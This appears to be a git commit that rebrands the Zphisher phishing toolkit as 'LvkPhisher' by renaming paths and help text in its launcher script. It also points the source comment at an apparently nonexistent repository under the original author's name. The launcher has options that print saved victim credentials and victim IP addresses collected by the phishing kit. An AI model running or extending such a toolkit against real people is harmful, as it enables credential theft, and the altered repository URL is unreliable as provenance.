acecb4d23e1a2cd88916cebe1675a8c16fe22602
Lvk777 <157662022+Lvk777@users.noreply.github.com>
2025-11-11 10:48:35 -0300

    Updated

--- scripts/launch.sh
+++ scripts/launch.sh
@@ -1,15 +1,15 @@
 #!/bin/bash
 
-# https://github.com/htr-tech/zphisher
+# https://github.com/htr-tech/lvkphisher
 
 if [[ $(uname -o) == *'Android'* ]];then
-	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
+	LVKPHISHER_ROOT="/data/data/com.termux/files/usr/opt/lvkphisher"
 else
-	export ZPHISHER_ROOT="/opt/zphisher"
+	export LVKPHISHER_ROOT="/opt/lvkphisher"
 fi
 
 if [[ $1 == '-h' || $1 == 'help' ]]; then
-	echo "To run Zphisher type \`zphisher\` in your cmd"
+	echo "To run LvkPhisher type \`lvkphisher\` in your cmd"
 	echo
 	echo "Help:"
 	echo " -h | help : Print this menu & Exit"
@@ -17,16 +17,16 @@ if [[ $1 == '-h' || $1 == 'help' ]]; then
 	echo " -i | ip   : View Saved Victim IP"
 	echo
 elif [[ $1 == '-c' || $1 == 'auth' ]]; then
-	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
+	cat $LVKPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
 		echo "No Credentials Found !"
 		exit 1
 	}
 elif [[ $1 == '-i' || $1 == 'ip' ]]; then
-	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
+	cat $LVKPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
 		echo "No Saved IP Found !"
 		exit 1
 	}
 else
-	cd $ZPHISHER_ROOT
-	bash ./zphisher.sh
+	cd $LVKPHISHER_ROOT
+	bash ./lvkphisher.sh
 fi
